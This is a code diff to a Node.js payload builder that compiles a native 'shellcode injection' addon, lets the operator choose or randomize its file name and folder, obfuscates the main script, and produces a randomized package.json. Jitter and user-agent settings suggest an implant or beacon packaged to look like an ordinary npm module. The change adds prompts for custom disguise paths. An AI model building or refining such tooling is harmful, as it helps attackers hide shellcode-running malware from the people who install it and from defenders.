@@ -74,18 +74,43 @@ async function main() {
     console.log(`  Jitter:          ${config.jitter}s`);
     console.log('');
 
-    // Generate random module name and folder name
-    const randomModuleName = generateRandomModuleName();
-    const randomFolderName = generateRandomModuleName();
-    console.log(`[+] Generated random module name: ${randomModuleName}`);
-    console.log(`[+] Generated random folder name: ${randomFolderName}`);
+    // Prompt for file path and name
+    console.log('Native Module Configuration:');
+    const customPath = await prompt('Module file path (relative, e.g., "lib/utils" or "build/Release", "." for root, empty/"random" for random) [random]: ', '');
+    const customFileName = await prompt('Module filename (without .node extension, e.g., "inject", empty for random) [random]: ', '');
     console.log('');
 
-    // Build native addon with random name
+    // Generate random names if not provided
+    let moduleName, folderPath;
+    if (customFileName.trim()) {
+        moduleName = customFileName.trim();
+    } else {
+        moduleName = generateRandomModuleName();
+        console.log(`[+] Generated random module name: ${moduleName}`);
+    }
+
+    const pathInput = customPath.trim().toLowerCase();
+    if (pathInput === '' || pathInput === 'random') {
+        folderPath = generateRandomModuleName();
+        console.log(`[+] Generated random folder path: ${folderPath}`);
+    } else {
+        folderPath = customPath.trim().replace(/\\/g, '/'); // Normalize path separators
+        // Remove leading/trailing slashes, but preserve "." for root
+        if (folderPath === '.' || folderPath === './' || folderPath === '/.') {
+            folderPath = ''; // Empty string means root directory
+            console.log(`[+] Using root directory`);
+        } else {
+            folderPath = folderPath.replace(/^\/+|\/+$/g, '');
+            console.log(`[+] Using custom path: ${folderPath}`);
+        }
+    }
+    console.log('');
+
+    // Build native addon with module name
     console.log('[+] Building native shellcode injection addon...');
     try {
-        // Update binding.gyp and inject.cc with random module name
-        updateModuleName(randomModuleName);
+        // Update binding.gyp and inject.cc with module name
+        updateModuleName(moduleName);
         
         execSync('npm run build:addon', { stdio: 'inherit' });
         console.log('');
@@ -101,7 +126,7 @@ async function main() {
         process.exit(1);
     }
 
-    buildPayload(config, JavaScriptObfuscator, randomModuleName, randomFolderName);
+    buildPayload(config, JavaScriptObfuscator, moduleName, folderPath);
 }
 
 function generateRandomModuleName() {
@@ -166,7 +191,7 @@ function restoreModuleName() {
     }
 }
 
-function buildPayload(config, JavaScriptObfuscator, moduleName, folderName) {
+function buildPayload(config, JavaScriptObfuscator, moduleName, folderPath) {
 
 // Directories
 const sourceDir = __dirname;
@@ -246,10 +271,12 @@ if (config.ua) {
     );
 }
 
-// Replace inject module name and path with random names
+// Replace inject module name and path with provided or random names
+// If folderPath is empty, place in root; otherwise use the folder path
+const requirePath = folderPath ? `./${folderPath}/${moduleName}.node` : `./${moduleName}.node`;
 mainCode = mainCode.replace(
     /require\(['"]\.\/build\/Release\/inject\.node['"]\)/g,
-    `require('./${folderName}/${moduleName}.node')`
+    `require('${requirePath}')`
 );
 
 // Obfuscate main.js
@@ -287,9 +314,11 @@ if (fs.existsSync(moduleSrc)) {
     process.exit(1);
 }
 
-// Create random folder directory structure
-fs.mkdirSync(path.join(outputDir, folderName), { recursive: true });
-fs.copyFileSync(moduleDst, path.join(outputDir, folderName, `${moduleName}.node`));
+// Create folder directory structure (supports subdirectories)
+// If folderPath is empty, place in root; otherwise create the folder structure
+const finalPath = folderPath ? path.join(outputDir, folderPath) : outputDir;
+fs.mkdirSync(finalPath, { recursive: true });
+fs.copyFileSync(moduleDst, path.join(finalPath, `${moduleName}.node`));
 fs.unlinkSync(moduleDst);
 
 // Generate randomized package.json
